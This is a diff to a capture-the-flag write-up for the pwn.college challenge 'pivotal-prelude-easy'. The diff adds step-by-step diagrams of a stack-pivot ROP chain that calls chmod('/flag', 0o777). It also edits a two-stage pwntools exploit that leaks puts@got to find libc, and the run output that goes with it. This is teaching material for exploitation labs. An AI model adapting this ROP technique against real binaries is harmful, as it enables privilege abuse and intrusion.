+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x4150f8 │  43 43 43 43 43 43 43 43  │ ( b"CCCCCCCC" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415110 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop r13 ; pop r14 ; pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════     
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x4150f0 │  00 00 00 67 61 6c 66 2f  │ ( b"/flag\x00\x00\x00" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x4150f8 │  43 43 43 43 43 43 43 43  │ ( b"CCCCCCCC" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415110 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+r13: b"/flag\x00\x00\x00"
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop r14 ; pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════                
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x4150f8 │  43 43 43 43 43 43 43 43  │ ( b"CCCCCCCC" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415100 │  44 44 44 44 44 44 44 44  │ ( b"DDDDDDDD" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415110 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+r13: b"/flag\x00\x00\x00"
+r14: b"CCCCCCCC"
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════     
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415108 │  00 00 00 00 00 40 23 f3  │ --> ( pop rdi ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415110 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+r13: b"/flag\x00\x00\x00"
+r14: b"CCCCCCCC"
+r15: b"DDDDDDDD"
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════    
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415110 │  00 00 00 00 00 41 50 f0  │ --> ( b"/flag\x00\x00\x00" + b"CCCCCCCC" + ..... )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+r13: b"/flag\x00\x00\x00"
+r14: b"CCCCCCCC"
+r15: b"DDDDDDDD"
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rdi ; ret
+═══════════════════════════════════════════════════════════════════════════════════   
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415118 │  00 00 00 00 00 40 23 f1  │ --> ( pop rsi ; pop r15; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x4150f0
+r13: b"/flag\x00\x00\x00"
+r14: b"CCCCCCCC"
+r15: b"DDDDDDDD"
+
+Function call setup:
+chmod("/flag")
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════   
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415120 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x4150f0
+r13: b"/flag\x00\x00\x00"
+r14: b"CCCCCCCC"
+r15: b"DDDDDDDD"
+
+Function call setup:
+chmod("/flag")
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rsi ; pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════   
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415128 │  45 45 45 45 45 45 45 45  │ --> ( b"EEEEEEEE" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                  0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x4150f0
+rsi: 0x1ff
+r13: b"/flag\x00\x00\x00"
+r14: b"CCCCCCCC"
+r15: b"DDDDDDDD"
+
+Function call setup:
+chmod("/flag", 0o777)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop r15 ; ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+          rsp --> 0x415130 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x4150f0
+rsi: 0x1ff
+r13: b"/flag\x00\x00\x00"
+r14: b"CCCCCCCC"
+r15: b"EEEEEEEE"
+
+Function call setup:
+chmod("/flag", 0o777)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+BSS:
+                           ┌───────────────────────────┐
+                           │  .. .. .. .. .. .. .. ..  │
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x4150f0
+rsi: 0x1ff
+r13: b"/flag\x00\x00\x00"
+r14: b"CCCCCCCC"
+r15: b"EEEEEEEE"
+
+Function call setup:
+chmod("/flag", 0o777)
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> chmod("/flag", 0o777)
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+
+We would have the address of `puts` within Libc by the end, from which we can calculate the base address of Libc and the address of `chmod` within Libc. The call to `_start()` would restart the challenge, and give us a chance to execute the second stage.
 
 ### Exploit
 
@@ -7685,14 +8461,13 @@ puts_plt = 0x401120
 puts_got = 0x405028
 # Memory addresses and offsets
 _start_func_addr = 0x4011d0
-bang_addr = 0x4037bd
 bss_rop_chain_addr = 0x4150e0 + 16
 offset = 0
 
 p = process('/challenge/pivotal-prelude-easy')
 
 # --- STAGE 1: Leak address of `puts` within Libc ---
-log.info("Sending Stage 2: puts(puts@got)")
+log.info("Sending Stage 1: puts(puts@got)")
 payload1 = flat(
     b"A" * offset,
 
@@ -7739,7 +8514,7 @@ payload2 = flat(
 
     # chmod("/flag", 0o777)
     pop_rdi, bss_rop_chain_addr,      
-    pop_rsi_pop_r15, 0o777, b"B" * 8, 
+    pop_rsi_pop_r15, 0o777, b"E" * 8, 
     chmod_libc
 )
 
@@ -7750,17 +8525,17 @@ p.interactive()
 
 ```
 hacker@return-oriented-programming~pivotal-prelude-easy:/$ python ~/script.py
-[+] Starting local process '/challenge/pivotal-prelude-easy': pid 753
-[*] Sending Stage 2: puts(puts@got)
+[+] Starting local process '/challenge/pivotal-prelude-easy': pid 36587
+[*] Sending Stage 1: puts(puts@got)
 
-[+] puts@libc: 0x7c26fd067420
-[+] libc_base: 0x7c26fcfe3000
-[+] chmod@libc: 0x7c26fd0f0d80
+[+] puts@libc: 0x7f4fa40f8420
+[+] libc_base: 0x7f4fa4074000
+[+] chmod@libc: 0x7f4fa4181d80
 
 [*] Sending Stage 2: chmod('!', 0o777)
 [*] Switching to interactive mode
 
-[*] Process '/challenge/pivotal-prelude-easy' stopped with exit code -11 (SIGSEGV) (pid 753)
+[*] Process '/challenge/pivotal-prelude-easy' stopped with exit code -11 (SIGSEGV) (pid 36587)
 Received 88 bytes! This is potentially 11 gadgets.
 Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
 from within this challenge. You will have to do that by yourself.
@@ -7775,8 +8550,8 @@ from within this challenge. You will have to do that by yourself.
 | 0x00000000004150f0: (DISASSEMBLY ERROR) 2f 66 6c 61 67 00 00 00 43 43 43 43 43 43 43 43 
 | 0x00000000004023f1: pop rsi ; pop r15 ; ret  ; 
 | 0x00000000000001ff: (UNMAPPED MEMORY)
-| 0x4242424242424242: (UNMAPPED MEMORY)
-| 0x00007c26fd0f0d80: endbr64  ; mov eax, 0x5a ; syscall  ; cmp rax, -0xfff ; jae 0x7c26fd0f0d94 ; ret  ; 
+| 0x4545454545454545: (UNMAPPED MEMORY)
+| 0x00007f4fa4181d80: endbr64  ; mov eax, 0x5a ; syscall  ; cmp rax, -0xfff ; jae 0x7f4fa4181d94 ; ret  ; 
 
 Of course, only 24 bytes of the above ropchain was copied to the stack!
 Let's take a look at just that part of the chain. To execute the rest, you'll have to pivot the stack!
@@ -7788,7 +8563,7 @@ Let's take a look at just that part of the chain. To execute the rest, you'll ha
 
 Leaving!
 [*] Got EOF while reading in interactive
-$
+$  
 ```
 
 ```
